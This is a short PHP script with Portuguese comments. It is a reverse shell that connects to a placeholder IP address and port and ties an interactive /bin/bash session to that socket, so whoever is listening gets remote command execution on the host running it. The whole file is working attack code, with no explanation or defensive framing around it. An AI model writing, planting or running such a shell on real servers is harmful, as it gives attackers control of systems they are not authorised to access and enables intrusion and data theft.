<?php
$ip = '[IP]';
$port = [PORT];
$sock = fsockopen($ip, $port);
if (!$sock) {
    exit();
}

// Executa uma shell bash
$descriptorspec = array(
    0 => $sock,  // stdin está conectado ao socket
    1 => $sock,  // stdout está conectado ao socket
    2 => $sock   // stderr está conectado ao socket
);

$process = proc_open('/bin/bash -i', $descriptorspec, $pipes);

if (is_resource($process)) {
    while (true) {
        // Continue rodando o processo
        if (feof($sock)) {
            break;  // Se a conexão for fechada, saia do loop
        }
        usleep(100000);  // Pequena pausa para não sobrecarregar a CPU
    }
    fclose($sock);
    proc_close($process);
}
?>
